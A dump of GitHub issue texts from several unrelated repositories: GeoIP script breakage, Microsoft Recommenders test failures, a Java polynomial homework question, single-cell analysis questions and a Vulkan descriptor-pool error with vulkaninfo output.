React-Native: 0.59.9  how to change the cropped image border color blue dotted lines to black? I used RNGeniusScan. Hello :) 

I didn't find any option to change the language of the scanning interface in the SDK API.
Also changing the phone language didn't work :( 

Any suggestions? :)
<---------->
148373140
Due to upcoming data privacy regulations, MaxMind is making significant changes to how we can access free GeoLite2 databases, starting December 30, 2019

See [their blog post](https://blog.maxmind.com/2019/12/18/significant-changes-to-accessing-and-using-geolite2-databases/) for details. Hey guys,

It's found that ipv6 cannot be filtered with the latest xtables geoip module, this was also reported in the mail-list.

> https://www.spinics.net/lists/netfilter-devel/msg61906.html

So I just wonder if you have verified ipv6 with this script, or it's only related to kernel/netfliter? As written  [here](https://blog.maxmind.com/2019/12/18/significant-changes-to-accessing-and-using-geolite2-databases/) they have changed the way of accessing that DB and script cannot download it. Can you update it and add extra config fields so everybody can use it? Was looking for IP 94.112.103.137, found different records:
"194.112.102.0","194.112.103.255","3262146048","3262146559","GB","United Kingdom"
and
"94.112.0.0","94.113.255.255","1584398336","1584529407","CZ","Czechia"
in resulted GeoIP-legacy.csv Dears,
When executing the command /usr/lib/xtables-addons/xt_geoip_build -D /usr/share/xt_geoip /usr/share/xt_geoip/GeoIP-legacy.csv erros ocurrs: Couldn't open list country names.
I need a help!
<---------->
148736243
请问we-miaosha在哪里下载呢？
另外想问这个项目就是按问题顺序看吗？ 注册报错 
墙裂推荐: [Hostwinds+ssr](https://github.com/xiaoming2028/Free-PAC/wiki/VPS%E4%B8%80%E9%94%AE%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BASS%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B-Hostwinds%E6%90%AD%E5%BB%BAssr) 不知道是否可以更新下install 指南，方便走读代码 好多markdown文件中的图片都失效了，作者麻烦看一下 maven仓库也找不到，啥情况？ 项目导入idea怎么启动，各模块继承关系希望补一下文档。 ### What is the problem with Chinese README's

Firstly, we congratulate you for getting so much star by sharing this repository with humanity.

But it is very disappointing for non-Chinese speakers when one couldn't understand what a trending repository is about.

When we see such a repo on trending, our minds are blurring like Gollum's.

![Gollum Image](https://media.giphy.com/media/V4uGHRgz0zi6Y/giphy-downsized-large.gif)

There is a way **you can help** to solve this disappointment which I believe is experienced by many people who want to know more about your valuable work and appreciate it.

### What we want:
 - Please add English translation of your README so you are sharing your work and knowledge with more people.

### How this will help you:
 - More feedback to fix and improve your project.
 - New ideas about your project.
 - Greater fame.
 - ![SungerBob Image](https://media.giphy.com/media/3o7absbD7PbTFQa0c8/source.gif)

---

_“Sharing knowledge is the most fundamental act of friendship. Because it is a way you can give something without loosing something.”_

_**— Richard Stallman**_

**Thank you!**	

> The developers of repo will not be held responsible for problems that arise in this script.

> This issue generated by [us/english-please](github.com/us/english-please) script. Please open issue on any error. Thank you!
 字节跳动教育线新项目，大投入，千亿级市场，服务端工程师大量缺口(客户端，前端也招)，各级别都要。项目主要使用Golang/Python，但是语言不做要求，可以来了再学。研发直招渠道，快速反馈，支持年前面试(可以远程面试)，年后报道，北京、上海都有HC。完整简历请投邮箱 lichengqian@bytedance.com。邮件标题：在线教育+姓名 请问we-miaosha在哪里下载呢？
另外想问这个项目就是按问题顺序看吗？ 不知道是否可以更新下install 指南，方便走读代码 clone GitHub上的其他项目速度正常，本项目则速度骤降，一直维持在10几Kb的速度，请问其他人有遇到这样的吗？ 好多markdown文件中的图片都失效了，作者麻烦看一下 https://github.com/qiurunze123/miaosha/pull/45 注册报错 问一下，解决思路404是因为没有上传么  https://github.com/qiurunze123/miaosha/pull/45  https://coding.imooc.com/class/168.html
<---------->
149430917
### *What* is affected by this bug?

* *Creating an appropriate cluster*
* *Running a notebook on that cluster*
* *Unit tests.*

### In *which* platform does it happen?
* *Azure Databricks.*

### *How* do we replicate the issue?

1. *Create a databricks workspace*
2. *Navigate to Clusters*
3. *Click [+Create Cluster]* In the Databricks Runtime Version, there is no longer an option for DB 4.1, Spark 2.3.0. It was deprecated on 2019-01-17. See deprecation schedule [here](https://docs.azuredatabricks.net/release-notes/runtime/databricks-runtime-ver.html#deprecation-policy).

### Expected behavior (i.e. solution)

Workarounds:

- It is still possible to create a cluster by cloning a cluster of the recommended version.
- It is still possible to create a cluster through the API. Happy to do PR with appropriate json for creating with databricks CLI or directly through the REST API.

### Other Comments

Have we tested whether the cosmosdb connector jar works with more current versions of ADB and spark? We have to update the README for the new algos that are in the repo. We also have to update the benchmark results.

@gramhagen could you do VW? I will do FastAI
 details were cut from contributing.md to shorten that document

we should move those details into the wiki and reference them in the markdown document to avoid losing that information

 ### Description
Ran this test:
pytest tests/unit/test_notebooks_python.py -k test_surprise_deep_dive_runs

See this error output:

E           papermill.exceptions.PapermillExecutionError:
E           ---------------------------------------------------------------------------
E           Exception encountered at "In [10]":
E           ---------------------------------------------------------------------------
E           TypeError                                 Traceback (most recent call last)
E           <ipython-input-10-c83530820ecb> in <module>
E           ----> 1 eval_rmse = rmse(test, predictions)
E                 2 eval_mae = mae(test, predictions)
E                 3 eval_rsquared = rsquared(test, predictions)
E                 4 eval_exp_var = exp_var(test, predictions)
E                 5
E
E           ~\notebooks\Recommenders\reco_utils\evaluation\python_evaluation.py in check_column_dtypes_wrapper(rating_true, rating_pred, col_user, col_item, col_rating, col_prediction, *args, **kwargs)
E                57             raise TypeError(
E                58                 "data types of column {} are different in true and prediction".format(
E           ---> 59                     col_user
E                60                 )
E                61             )
E
E           TypeError: data types of column userID are different in true and prediction

### In which platform does it happen?
Tested on a Windows CPU DSVM

### How do we replicate the issue?
I created a Windows DSVM (Standard DS3 v2 - 4 vcpus, 14 GB memory). Don't know if this issue is specific to Windows (probably not).
Windows setup steps were (for now):

1. login to DSVM
2. cd notebooks
3. git clone https://github.com/Microsoft/Recommenders
4. git checkout staging
5. conda update conda
6. conda update --all
7. cd Recommenders
8. python scripts/generate_conda_file.py
9. conda env create -f reco_base.yaml
10. conda info --envs (list environments, verify "reco_base" is there)
11. conda activate reco_base
12. pytest tests/unit/test_notebooks_python.py -k test_surprise_deep_dive_runs

### Expected behavior (i.e. solution)
The test should run successfully

### Other Comments
 details were cut from contributing.md to shorten that document

we should move those details into the wiki and reference them in the markdown document to avoid losing that information

 ### *What* is affected by this bug?
This repo makes numerous references to this directory.  I think it is important to have a README in this directory to give an overview of this directory. ### Description
I'm trying to run RBM on a problem with about 20K users and 40K items. Is there a way to quickly figure out what type of Azure Machine Learning Compute I would need to handle this size of problem, especially for the GPU. I can run this on an Standard NC12 on the CPU, but when I try to run it with the GPU I get an OOM error or the run fails with the last log entry somewhere deep in Tensorflow.

### Other Comments
 Getting the following warnings when run model.fit and recommend_k_items w/ SAR singlenode implementation:

/git/Recommenders/reco_utils/recommender/sar/sar_singlenode.py:216: SettingWithCopyWarning: 
A value is trying to be set on a copy of a slice from a DataFrame.
Try using .loc[row_indexer,col_indexer] = value instead

See the caveats in the documentation: http://pandas.pydata.org/pandas-docs/stable/indexing.html#indexing-view-versus-copy
  df["exponential"] = expo_fun(df[self.col_timestamp].values)
/git/Recommenders/reco_utils/recommender/sar/sar_singlenode.py:218: SettingWithCopyWarning: 
A value is trying to be set on a copy of a slice from a DataFrame.
Try using .loc[row_indexer,col_indexer] = value instead

See the caveats in the documentation: http://pandas.pydata.org/pandas-docs/stable/indexing.html#indexing-view-versus-copy
  df["rating_exponential"] = df[self.col_rating] * df["exponential"]
/git/Recommenders/reco_utils/recommender/sar/sar_singlenode.py:280: FutureWarning: Method .as_matrix will be removed in a future version. Use .values instead.
  self.index = df.as_matrix([self._col_hashed_users, self._col_hashed_items])
/home/jumin/miniconda3/envs/reco_bare/lib/python3.6/site-packages/scipy/sparse/base.py:594: RuntimeWarning: invalid value encountered in true_divide
  return np.true_divide(self.todense(), other)

 ### Description
Get this error running unit test:

`E           papermill.exceptions.PapermillExecutionError:
E           ---------------------------------------------------------------------------
E           Exception encountered at "In [15]":
E           ---------------------------------------------------------------------------
E           TypeError                                 Traceback (most recent call last)
E           <ipython-input-15-9eddaaa7187e> in <module>
E                 4               relevancy_method='top_k', k=TOP_K)
E                 5
E           ----> 6 rank_metrics = {'MAP': map_at_k(*args, **kwargs),
E                 7                 'NDCG': ndcg_at_k(*args, **kwargs),
E                 8                 'Precision': precision_at_k(*args, **kwargs),
E
E           ~\notebooks\Recommenders\reco_utils\evaluation\python_evaluation.py in check_column_dtypes_wrapper(rating_true, rating_pred, col_user, col_item, col_rating, col_prediction, *args, **kwargs)
E                57             raise TypeError(
E                58                 "data types of column {} are different in true and prediction".format(
E           ---> 59                     col_user
E                60                 )
E                61             )`

### In which platform does it happen?
Windows DSVM

### How do we replicate the issue?
The steps are exactly the same as issue 616, except the test to run is:
pytest tests/unit -m "not notebooks and not spark and not gpu"
or more specifically:
pytest tests/unit -m "notebooks and not spark and not gpu" -k vw

### Expected behavior (i.e. solution)
should run successfully without any errors

### Other Comments
Had a discussion with Jun and Scott about this. One possible workaround is to make this change to: Recommenders\reco_utils\evaluation\python_evaluation.py:

from: if rating_true[col_user].dtypes != rating_pred[col_user].dtypes:
to:if rating_true[col_user].dtype.type.__base__ != rating_pred[col_user].dtype.type.__base__:

and

from:if rating_true[col_item].dtypes != rating_pred[col_item].dtypes:
to:if rating_true[col_item].dtype.type.__base__ != rating_pred[col_item].dtype.type.__base__:

Scott made the following suggestion, which makes a lot of sense:

I think the right solution is to create a couple utility functions to check that columns exists, and another to check that two dataframes have the same base types for columns of interest, or alternatively to remove unnecessary type checks

Another open question is how pervasive this type of check happens - it would be nice to fix this across the repo.
 ### Description
<!--- Describe your expected feature in detail -->
I recently discovered [flaky](https://github.com/box/flaky).  It might be interesting to see whether this is useful to us 

Description from page: https://docs.pytest.org/en/latest/flaky.html
Flaky tests
A “flaky” test is one that exhibits intermittent or sporadic failure, that seems to have non-deterministic behaviour. Sometimes it passes, sometimes it fails, and it’s not clear why. This page discusses pytest features that can help and other general strategies for identifying, fixing or mitigating them.

Why flaky tests are a problem
Flaky tests are particularly troublesome when a continuous integration (CI) server is being used, so that all tests must pass before a new code change can be merged. If the test result is not a reliable signal – that a test failure means the code change broke the test – developers can become mistrustful of the test results, which can lead to overlooking genuine failures. It is also a source of wasted time as developers must re-run test suites and investigate spurious failures. ### Description
Every time the SARSingleNode.score(**) is called for a list of users, it actually calculates the scores for all users. In our training-set of nearly .5M rows. The dot product of the 'User Affinity'-matrix and 'Item Similarity'-matrix takes roughly 5+ seconds. The sizes of these matrices are respectively (23009, 17262) and (17262, 17262). This is too slow when calculating recommendations for one user.

### Expected behavior with the suggested feature
Optimize calculations by only calculating the scores for the specified users.

### Other Comments
This is already a TODO: https://github.com/microsoft/recommenders/blob/71a38d422c00329f8f8226ea24ad6260b1b7b4e9/reco_utils/recommender/sar/sar_singlenode.py#L304 ### Description
This applies to any notebook using pm.record to capture logs.

### In which platform does it happen?
this applies to all platforms and any notebook using papermill.record

### How do we replicate the issue?
Run the SARS notebook.
The last cell uses pm.record and generates a warning:
/data/anaconda/envs/reco_full/lib/python3.6/site-packages/ipykernel_launcher.py:3: DeprecationWarning: Function record is deprecated and will be removed in verison 1.0.0 (current version 0.19.0). Please see `scrapbook.glue` (nteract-scrapbook) as a replacement for this functionality.
  This is separate from the ipykernel package so we can avoid doing imports until

### Expected behavior (i.e. solution)

### Other Comments
Scrapbook does not appear to be a drop in replacement for pm.record .
 ### Description
<!--- Describe your issue/bug/request in detail -->
https://github.com/Microsoft/Recommenders/blob/master/notebooks/04_model_select_and_optimize/azureml_hyperdrive_wide_and_deep.ipynb
The "entry script" links do not work (give 404).
 ### Description
<!--- Describe your expected feature in detail -->
Notebooks in https://github.com/Microsoft/Recommenders/tree/staging/notebooks/04_model_select_and_optimize
are not named consistently. 
 ### Description
with MMLSpark 0.17 release we can use the official release instead of dev versions in install scripts.

### Expected behavior with the suggested feature
search for mmlspark jar references and replace them with 0.17 release jar on maven

### Other Comments
https://github.com/Azure/mmlspark/releases/tag/v0.17
https://mvnrepository.com/artifact/Azure/mmlspark/0.17 ### Description
<!--- Describe your expected feature in detail -->
Notebooks in https://github.com/Microsoft/Recommenders/tree/staging/notebooks/04_model_select_and_optimize
are not named consistently. 
 ### Description
<!--- Describe your issue/bug/request in detail -->
The splitter methods in python_splitters.py return a dataframe that includes the split_index column.
E.g.
`train, validation, test = python_random_split(data, [0.7, 0.15, 0.15])`
`train, validation, test` will have a column called split_index.

### Expected behavior (i.e. solution)
<!--- For example:  -->
<!--- * The tests for SAR PySpark should pass successfully. -->
Return dataframe without split_index. ### Description
<!--- Describe your expected feature in detail -->
For genre types on movielens, one movie can have multiple genres. When movielens data was loaded and split by "|", for the field 'genres_string', some records contain multiple features as list . for example, [Comedy, Drama] or [Action, Comedy, Drama]. Our current libffm converter can't handle it.

### Expected behavior with the suggested feature
get distinct feature list from feature combination and then do conversion
### Other Comments
 ### Description
<!--- Describe your issue/bug/request in detail -->
In hypertune_spark_deep_dive.ipynb, eval_time is set to the UNIX time, not to the duration of the run.

 ### Description
<!--- Describe your issue/bug/request in detail -->
In hypertune_spark_deep_dive.ipynb, eval_time is set to the UNIX time, not to the duration of the run.


<---------->
149573646
For some reasons, my project can not use cocoapods. Therefore, I imported the files in the classes folder to my project. However, there are some compile errors, which are some symbols undefined, such as IOObjectRelease, IOIteratorNext. I wonder how to integrate the GPUUtilzation manually? Thanks:) For some reasons, my project can not use cocoapods. Therefore, I imported the files in the classes folder to my project. However, there are some compile errors, which are some symbols undefined, such as IOObjectRelease, IOIteratorNext. I wonder how to integrate the GPUUtilzation manually? Thanks:)
<---------->
149894118
Hello Sir. I'm a Graphics Designer. I'm happy to see an open source project, So, I want provide a logo for you. Would you mind if I propose a new logo design for your project as my Open Source Contribution?

Thanks for the attention.
<---------->
150166643
Hello! I must create the next Java program, maybe you could help me, please: given two lists (you must choose the data lists lines that are considered suitable for the solution of the project: ----Simple Linear Lists, Linear Circular Lists, Double Chained Linear Lists----) polynomial1 and polynomial2, which represent polynomials, elaborate the methods that return in a list sumapoli the sum of the polynomials (polynomial1 + polynomial2) and in a list of multiplication products of the polynomials (polynomial1 * polynomial2). The list is stored in an object of the class "Polynomial" and each element of the list is an object of the class Term; at a general level, a Polynomial will be made up of a finite number of Terms. The polynomials are read through a plain text of the name "Polin.txt", with the following format:

Coefficient-1, exponent-1; Coefficient-2, exponent-2;

The file must contain ONLY two lines, where each one represents polynomial, these can not be, SECURE, that the terms are not repeated. According to the following example:

2x ^ 2 + 3x + 2

It would be represented in the plain text file as:

2.2; 3.1; 2.0

The independent term "2" will have the exponent "0". FOR EFFECTS OF THE PROBLEM, SUPPOSE THAT THE VARIABLE IS ALWAYS "X".

An interface must be created to carry out the project, objects for the operation and tests of this.



(The thing is I got the program to read plain text, but it reads the "comas" as the exponent, and I need it to read each number. I already have the Double Chained Linear Lists too). I noticed that `helm init` and other commands were either removed or the arguments changed. Would we be able to get an updated set of commands here? 

https://helm.sh/docs/topics/v2_v3_migration/#overview-of-helm-3-changes Hello! I must create the next Java program, maybe you could help me, please: given two lists (you must choose the data lists lines that are considered suitable for the solution of the project: ----Simple Linear Lists, Linear Circular Lists, Double Chained Linear Lists----) polynomial1 and polynomial2, which represent polynomials, elaborate the methods that return in a list sumapoli the sum of the polynomials (polynomial1 + polynomial2) and in a list of multiplication products of the polynomials (polynomial1 * polynomial2). The list is stored in an object of the class "Polynomial" and each element of the list is an object of the class Term; at a general level, a Polynomial will be made up of a finite number of Terms. The polynomials are read through a plain text of the name "Polin.txt", with the following format:

Coefficient-1, exponent-1; Coefficient-2, exponent-2;

The file must contain ONLY two lines, where each one represents polynomial, these can not be, SECURE, that the terms are not repeated. According to the following example:

2x ^ 2 + 3x + 2

It would be represented in the plain text file as:

2.2; 3.1; 2.0

The independent term "2" will have the exponent "0". FOR EFFECTS OF THE PROBLEM, SUPPOSE THAT THE VARIABLE IS ALWAYS "X".

An interface must be created to carry out the project, objects for the operation and tests of this.



(The thing is I got the program to read plain text, but it reads the "comas" as the exponent, and I need it to read each number. I already have the Double Chained Linear Lists too).
<---------->
150271933
Error: Directory ~/.PhpStorm2018.3/config is not looks like valid PhpStorm config directory https://i.imgur.com/dkrk6VG.png https://i.imgur.com/dkrk6VG.png Error: Directory ~/.PhpStorm2018.3/config is not looks like valid PhpStorm config directory
<---------->
151743383
 Hello

I was wondering if there exists a file with the output of findMarkers?

Thanks!
 Hi,

Thank you so much for sharing data and analysis protocol. 

As I begin to explore the atlas dataset, I'm wondering if the only way to get an atlas dataset with cell type annotation is to run the entire posted analysis pipeline, or is there any metadata file that already contains the annotation information.

Really appreciate all your help!
 Where to find the ygenes.tab file, which is required by the getHVGs() function? Hi,

I am trying to follow your (excellent!) method to re-run the analysis, mostly for learning more about single cell analysis, but also trying to explore the dataset further. After making a few minor changes to the scripts - mostly removing hard coded paths - I have tried to load the data using the load_data() function. I am currently running the code of step 7_define_clusters using R Studio Server on a 16 core 256GB RAM virtual machine.
I seem to be still stuck at the load_data step:

```
load_data(remove_doublets = TRUE, remove_stripped = TRUE, load_corrected = TRUE, root_dir = "~/data/atlas")
```

 The R process now has run for more than 3 hours, and peak memory usage was around 72GB (htop). I can see that the function must have progressed, as the different cores have been active during the three hours.

Is this expected behaviour? 

Thanks in advance!  Where to find the ygenes.tab file, which is required by the getHVGs() function? Hi,

Thank you so much for sharing data and analysis protocol. 

As I begin to explore the atlas dataset, I'm wondering if the only way to get an atlas dataset with cell type annotation is to run the entire posted analysis pipeline, or is there any metadata file that already contains the annotation information.

Really appreciate all your help!
 Hello

I was wondering if there exists a file with the output of findMarkers?

Thanks!
 Hi,

I am trying to follow your (excellent!) method to re-run the analysis, mostly for learning more about single cell analysis, but also trying to explore the dataset further. After making a few minor changes to the scripts - mostly removing hard coded paths - I have tried to load the data using the load_data() function. I am currently running the code of step 7_define_clusters using R Studio Server on a 16 core 256GB RAM virtual machine.
I seem to be still stuck at the load_data step:

```
load_data(remove_doublets = TRUE, remove_stripped = TRUE, load_corrected = TRUE, root_dir = "~/data/atlas")
```

 The R process now has run for more than 3 hours, and peak memory usage was around 72GB (htop). I can see that the function must have progressed, as the different cores have been active during the three hours.

Is this expected behaviour? 

Thanks in advance!
<---------->
151876489
I've just tried to run the "simple" sample on my laptop and I'm getting this error:

```
terminate called after throwing an instance of 'vk::OutOfPoolMemoryError'
  what():  vk::Device::allocateDescriptorSets: ErrorOutOfPoolMemory
```

Here's the output for `vulkaninfo`:

```
==========
VULKANINFO
==========

Vulkan Instance Version: 1.1.126


Instance Extensions: count = 18
====================
	VK_EXT_acquire_xlib_display            : extension revision 1
	VK_EXT_debug_report                    : extension revision 9
	VK_EXT_debug_utils                     : extension revision 1
	VK_EXT_direct_mode_display             : extension revision 1
	VK_EXT_display_surface_counter         : extension revision 1
	VK_KHR_device_group_creation           : extension revision 1
	VK_KHR_display                         : extension revision 23
	VK_KHR_external_fence_capabilities     : extension revision 1
	VK_KHR_external_memory_capabilities    : extension revision 1
	VK_KHR_external_semaphore_capabilities : extension revision 1
	VK_KHR_get_display_properties2         : extension revision 1
	VK_KHR_get_physical_device_properties2 : extension revision 2
	VK_KHR_get_surface_capabilities2       : extension revision 1
	VK_KHR_surface                         : extension revision 25
	VK_KHR_surface_protected_capabilities  : extension revision 1
	VK_KHR_wayland_surface                 : extension revision 6
	VK_KHR_xcb_surface                     : extension revision 6
	VK_KHR_xlib_surface                    : extension revision 6

Layers: count = 3
=======
VK_LAYER_LUNARG_standard_validation (LunarG Standard Validation Layer) Vulkan version 1.0.126, layer version 1:
	Layer Extensions: count = 0
	Devices: count = 2
		GPU id 	: 0 (AMD RADV KABINI (LLVM 9.0.0))
		Layer-Device Extensions: count = 0

		GPU id 	: 1 (Unknown AMD GPU)
		Layer-Device Extensions: count = 0

VK_LAYER_VALVE_steam_overlay_32 (Steam Overlay Layer) Vulkan version 1.0.3, layer version 1:
	Layer Extensions: count = 0
	Devices: count = 2
		GPU id 	: 0 (AMD RADV KABINI (LLVM 9.0.0))
		Layer-Device Extensions: count = 0

		GPU id 	: 1 (Unknown AMD GPU)
		Layer-Device Extensions: count = 0

VK_LAYER_VALVE_steam_overlay_64 (Steam Overlay Layer) Vulkan version 1.0.3, layer version 1:
	Layer Extensions: count = 0
	Devices: count = 2
		GPU id 	: 0 (AMD RADV KABINI (LLVM 9.0.0))
		Layer-Device Extensions: count = 0

		GPU id 	: 1 (Unknown AMD GPU)
		Layer-Device Extensions: count = 0

Presentable Surfaces:
=====================
GPU id : 0 (AMD RADV KABINI (LLVM 9.0.0)):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 3
		maxImageCount       = 0
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
			COMPOSITE_ALPHA_INHERIT_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false


GPU id : 1 (Unknown AMD GPU):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 3
		maxImageCount       = 0
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
			COMPOSITE_ALPHA_INHERIT_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false


GPU id : 0 (AMD RADV KABINI (LLVM 9.0.0)):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 2
		maxImageCount       = 16
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
			IMAGE_USAGE_INPUT_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false


GPU id : 1 (Unknown AMD GPU):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 2
		maxImageCount       = 16
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
			IMAGE_USAGE_INPUT_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false



Groups:
=======
	Device Group Properties (Group 0):
		physicalDeviceCount: count = 1
			AMD RADV KABINI (LLVM 9.0.0) (ID: 0)
		subsetAllocation = 0

	Device Group Present Capabilities (Group 0):
		AMD RADV KABINI (LLVM 9.0.0) (ID: 0)
		Can present images from the following devices:
			AMD RADV KABINI (LLVM 9.0.0) (ID: 0)
		Present modes:
			DEVICE_GROUP_PRESENT_MODE_LOCAL_BIT_KHR

	Device Group Properties (Group 1):
		physicalDeviceCount: count = 1
			Unknown AMD GPU (ID: 0)
		subsetAllocation = 0

	Device Group Present Capabilities (Group 1):
		Unknown AMD GPU (ID: 0)
		Can present images from the following devices:
			Unknown AMD GPU (ID: 0)
		Present modes:
			DEVICE_GROUP_PRESENT_MODE_LOCAL_BIT_KHR


Device Properties and Extensions:
=================================
GPU0:
VkPhysicalDeviceProperties:
---------------------------
	apiVersion     = 4198507 (1.1.107)
	driverVersion  = 79699971 (0x4c02003)
	vendorID       = 0x1002
	deviceID       = 0x9851
	deviceType     = PHYSICAL_DEVICE_TYPE_INTEGRATED_GPU
	deviceName     = AMD RADV KABINI (LLVM 9.0.0)

VkPhysicalDeviceLimits:
-----------------------
	maxImageDimension1D                             = 16384
	maxImageDimension2D                             = 16384
	maxImageDimension3D                             = 2048
	maxImageDimensionCube                           = 16384
	maxImageArrayLayers                             = 2048
	maxTexelBufferElements                          = 134217728
	maxUniformBufferRange                           = 4294967295
	maxStorageBufferRange                           = 4294967295
	maxPushConstantsSize                            = 128
	maxMemoryAllocationCount                        = 4294967295
	maxSamplerAllocationCount                       = 65536
	bufferImageGranularity                          = 0x00000040
	sparseAddressSpaceSize                          = 0xffffffff
	maxBoundDescriptorSets                          = 32
	maxPerStageDescriptorSamplers                   = 9586978
	maxPerStageDescriptorUniformBuffers             = 9586978
	maxPerStageDescriptorStorageBuffers             = 9586978
	maxPerStageDescriptorSampledImages              = 9586978
	maxPerStageDescriptorStorageImages              = 9586978
	maxPerStageDescriptorInputAttachments           = 9586978
	maxPerStageResources                            = 9586978
	maxDescriptorSetSamplers                        = 9586978
	maxDescriptorSetUniformBuffers                  = 9586978
	maxDescriptorSetUniformBuffersDynamic           = 16
	maxDescriptorSetStorageBuffers                  = 9586978
	maxDescriptorSetStorageBuffersDynamic           = 8
	maxDescriptorSetSampledImages                   = 9586978
	maxDescriptorSetStorageImages                   = 9586978
	maxDescriptorSetInputAttachments                = 9586978
	maxVertexInputAttributes                        = 32
	maxVertexInputBindings                          = 32
	maxVertexInputAttributeOffset                   = 2047
	maxVertexInputBindingStride                     = 2048
	maxVertexOutputComponents                       = 128
	maxTessellationGenerationLevel                  = 64
	maxTessellationPatchSize                        = 32
	maxTessellationControlPerVertexInputComponents  = 128
	maxTessellationControlPerVertexOutputComponents = 128
	maxTessellationControlPerPatchOutputComponents  = 120
	maxTessellationControlTotalOutputComponents     = 4096
